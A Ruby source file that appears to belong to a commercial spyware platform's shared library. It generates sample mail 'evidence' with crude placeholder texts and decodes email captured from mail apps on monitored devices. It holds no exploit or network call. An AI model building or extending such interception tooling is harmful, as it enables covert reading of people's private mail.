# encoding: UTF-8

require 'rcs-common/evidence/common'
require 'mail'

module RCS
module MailEvidence

  MAIL_VERSION = 2009070301
  MAIL_VERSION2 = 2012030601

  MAIL_INCOMING = 0x00000010
  MAIL_DRAFT = 0x00000100

  PROGRAM_GMAIL = 0x00000000
  PROGRAM_BB = 0x00000001
  PROGRAM_ANDROID = 0x00000002
  PROGRAM_THUNDERBIRD = 0x00000003

  ADDRESSES = ['ciccio.pasticcio@google.com', 'billg@microsoft.com', 'john.doe@nasa.gov', 'mario.rossi@italy.it']
  SUBJECTS = ['drugs', 'bust me!', 'police here']
  BODIES = ["You're busted, dude.", "I'm a drug trafficker, send me to hang!", "I'll sell meth to kids. Stop me."]
  
  def content
    @email.to_s
  end
  
  def generate_content
    [ content ]
  end

  def additional_header
    binary = StringIO.new

    @email = Mail.new do
      from    ADDRESSES.sample
      to      ADDRESSES.sample
      subject SUBJECTS.sample
      body    BODIES.sample
    end

    ft_high, ft_low = Time.now.to_filetime
    body = @email.to_s
    add_header = [MAIL_VERSION2, 1 | MAIL_INCOMING, body.bytesize, ft_high, ft_low].pack("I*")
    binary.write(add_header)
    binary.write [[0,1,2].sample].pack('L')

    binary.string
  end

  def decode_additional_header(data)
    raise EvidenceDeserializeError.new("incomplete MAIL") if data.nil? or data.bytesize == 0

    ret = Hash.new
    ret[:data] = Hash.new

    binary = StringIO.new data

    # flags indica se abbiamo tutto il body o solo header
    version, flags, size, ft_low, ft_high = binary.read(20).unpack('L*')

    case version
      when MAIL_VERSION
        ret[:data][:program] = 'outlook'
      when MAIL_VERSION2
        program = binary.read(4).unpack('L').first

        case program
          when PROGRAM_GMAIL
            ret[:data][:program] = 'gmail'
          when PROGRAM_BB
            ret[:data][:program] = 'blackberry'
          when PROGRAM_ANDROID
            ret[:data][:program] = 'android'
          when PROGRAM_THUNDERBIRD
            ret[:data][:program] = 'thunderbird'
          else
            ret[:data][:program] = 'unknown'
        end
        # direction of the mail
        ret[:data][:incoming] = (flags & MAIL_INCOMING != 0) ? 1 : 0
        ret[:data][:draft] = true if (flags & MAIL_DRAFT != 0)
      else
        raise EvidenceDeserializeError.new("invalid log version for MAIL")
    end

    ret[:data][:size] = size
    return ret
  end

  def decode_content(common_info, chunks)
    info = Hash[common_info]
    info[:data] ||= Hash.new
    info[:data][:type] = :mail

    # this is the raw content of the mail
    # save it as is in the grid
    eml = chunks.join
    info[:grid_content] = eml

    # parse the mail to extract information
    m = Mail.read_from_string eml

    #trace :debug, "MAIL: EML size: #{eml.size}"
    #trace :debug, "MAIL: EML: #{eml}"
    #trace :debug, "MAIL: From: #{m.from.inspect}"
    #trace :debug, "MAIL: Rcpt: #{m.to.inspect}"
    #trace :debug, "MAIL: CC: #{m.cc.inspect}"
    #trace :debug, "MAIL: Subject: #{m.subject.inspect}"

    info[:data][:from] = parse_address(m.from)
    info[:data][:rcpt] = parse_address(m.to)
    info[:data][:cc] = parse_address(m.cc)
    info[:data][:subject] = m.subject.safe_utf8_encode unless m.subject.nil?

    #trace :debug, "MAIL: multipart #{m.multipart?} parts size: #{m.parts.size}"
    #trace :debug, "MAIL: parts #{m.parts.inspect}"
    #trace :debug, "MAIL: body: #{m.body}"

    # extract body from multipart mail
    body = parse_multipart(m.parts) if m.multipart?

    # if not multipart, take body
    body ||= {}
    body['text/plain'] ||= m.body.decoded.safe_utf8_encode unless m.body.nil?

    #trace :debug, "MAIL: text/plain #{body['text/plain']}"
    #trace :debug, "MAIL: text/html #{body['text/html']}"

    if body.has_key? 'text/html'
      info[:data][:body] = body['text/html']
    else
      info[:data][:body] = body['text/plain']
      info[:data][:body] ||= ''
    end

    info[:data][:attach] = m.attachments.length if m.attachments.length > 0

    date = m.date.to_time unless m.date.nil?
    date ||= Time.now
    info[:data][:date] = date.getutc
    info[:da] = date.getutc

    info[:data][:date] = info[:data][:date].to_time if info[:data][:date].is_a? DateTime
    info[:da] = info[:da].to_time if info[:da].is_a? DateTime

    yield info if block_given?
    :delete_raw
  end

  def parse_multipart(parts)
    content_types = parts.map { |p| p.content_type.split(';')[0] }
    body = {}
    content_types.each_with_index do |ct, i|
      case ct
        when 'multipart/alternative'
          body = parse_multipart(parts[i].parts)
        else
          body ||= {}
          body[ct] = parts[i].body.decoded.safe_utf8_encode
      end
    end
    body
  end

  def parse_address(addresses)
    return "" if addresses.nil?

    address = ''

    # it's already a string
    address = addresses if addresses.is_a? String

    # join the array of multiple addresses
    if addresses.is_a? Array
      address = addresses.join(", ")
    end

    address.safe_utf8_encode
  end

end # ::Mail

end # ::RCS